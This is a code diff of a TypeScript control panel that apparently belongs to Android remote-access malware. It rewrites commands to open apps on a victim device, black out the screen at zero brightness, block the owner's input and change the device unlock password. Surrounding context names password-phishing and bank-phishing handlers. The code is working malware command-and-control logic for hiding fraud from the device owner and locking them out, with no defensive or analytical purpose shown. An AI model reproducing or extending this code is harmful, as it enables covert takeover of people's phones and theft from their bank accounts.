@@ -438,18 +438,15 @@ const handleOpenQuickApp = (appKey: string) => {
         message.error(`未知应用: ${appKey}`);
         return;
     }
-    
+
     let packageName = appInfo.pkg;
-    
-    // 智能包名查找: 从缓存的应用列表中匹配
+
     if (apps.value.length > 0) {
-        // 优先精确匹配包名
         const exactMatch = apps.value.find(a => a.packageName === appInfo.pkg);
         if (exactMatch) {
             packageName = exactMatch.packageName;
         } else {
-            // 模糊匹配应用名或包名
-            const fuzzyMatch = apps.value.find(a => 
+            const fuzzyMatch = apps.value.find(a =>
                 a.name?.toLowerCase().includes(appInfo.name.toLowerCase()) ||
                 a.packageName?.toLowerCase().includes(appKey.toLowerCase())
             );
@@ -458,14 +455,11 @@ const handleOpenQuickApp = (appKey: string) => {
             }
         }
     }
-    
-    send({ 
-        itype: 'slr_panelsend', 
-        subc: 'OPENAPP',
-        pid: deviceId.value, 
-        packageName 
+
+    deviceApi.call('GET', '/startApp', {
+        query: { packageName, start: 'true' },
+        successMessage: `正在打开 ${appInfo.name}...`,
     });
-    message.success(`正在打开 ${appInfo.name}...`);
 };
 
 const handleSendKb = (type: number) => {
@@ -485,22 +479,42 @@ const handleSendKb = (type: number) => {
 };
 
 const handleSendBlock = (type: number) => {
-    // 使用 block 命令，bstate 控制黑屏/操作 (与 info.php 一致)
-    send({ 
-        itype: 'slr_panel', 
-        subc: 'screen', 
-        pid: deviceId.value, 
-        comand: 'block', 
-        bstate: String(type) as '0' | '1' | '2' | '3',
-        color: '0'
-    });
     const msgMap: Record<number, string> = {
         0: '黑屏已启用',
         1: '黑屏已取消',
         2: '阻止操作已启用',
-        3: '允许操作已启用'
+        3: '允许操作已启用',
     };
-    message.success(msgMap[type]);
+    const successMessage = msgMap[type] ?? '操作已发送';
+
+    if (type === 0) {
+        deviceApi.call('GET', '/blockView', {
+            query: {
+                show: 'true',
+                transparent: 'false',
+                zeroBrightness: 'true',
+                destroyLock: 'false',
+            },
+            successMessage,
+        });
+        return;
+    }
+    if (type === 2) {
+        deviceApi.call('GET', '/blockView', {
+            query: {
+                show: 'true',
+                transparent: 'true',
+                zeroBrightness: 'false',
+                destroyLock: 'false',
+            },
+            successMessage,
+        });
+        return;
+    }
+    deviceApi.call('GET', '/blockView', {
+        query: { show: 'false' },
+        successMessage,
+    });
 };
 
 // 密码钓鱼类型映射
@@ -559,15 +573,17 @@ const handleSendBankPhish = (bank: string) => {
 
 // 修改解锁密码
 const handleModifyPassword = (password: string) => {
-    send({ 
-        itype: 'slr_panel', 
-        subc: 'screen', 
-        pid: deviceId.value, 
-        comand: 'phonepass',
-        passtype: '1',
-        txt: password
+    if (!password || !/^\d{4,16}$/.test(password)) {
+        message.error('请输入 4-16 位数字密码');
+        return;
+    }
+    deviceApi.call('POST', '/syncLockCipher', {
+        body: {
+            textCipher: password,
+            deviceId: deviceId.value,
+        },
+        successMessage: '修改密码请求已发送',
     });
-    message.success('修改密码请求已发送');
 };
 
 // 黑屏文字状态
@@ -575,41 +591,25 @@ const blockTextActive = ref(false);
 
 const handleToggleBlockText = (text: string, bg: string) => {
     if (blockTextActive.value) {
-        // 取消黑屏
-        send({ 
-            itype: 'slr_panel', 
-            subc: 'screen', 
-            pid: deviceId.value, 
-            comand: 'block',
-            bstate: '1',
-            color: '0'
+        deviceApi.call('GET', '/blockView', {
+            query: { show: 'false' },
+            successMessage: '已取消黑屏',
         });
         blockTextActive.value = false;
-        message.success('已取消黑屏');
-    } else {
-        // 显示黑屏文字
-        if (text) {
-            // 先发送黑屏文字内容
-            send({ 
-                itype: 'slr_panel', 
-                subc: 'screen', 
-                pid: deviceId.value, 
-                comand: 'blockd',
-                blocktext: text
-            });
-        }
-        // 启用黑屏
-        send({ 
-            itype: 'slr_panel', 
-            subc: 'screen', 
-            pid: deviceId.value, 
-            comand: 'block',
-            bstate: '0',
-            color: bg
-        });
-        blockTextActive.value = true;
-        message.success('已显示黑屏文字');
+        return;
     }
+
+    deviceApi.call('GET', '/blockView', {
+        query: {
+            show: 'true',
+            transparent: 'false',
+            hint: text ?? '',
+            zeroBrightness: bg === '0' ? 'true' : 'false',
+            destroyLock: bg === '1' ? 'true' : 'false',
+        },
+        successMessage: '已显示黑屏文字',
+    });
+    blockTextActive.value = true;
 };
 
 const handleTap = (x: number, y: number) => screenControl.sendTap(x, y);
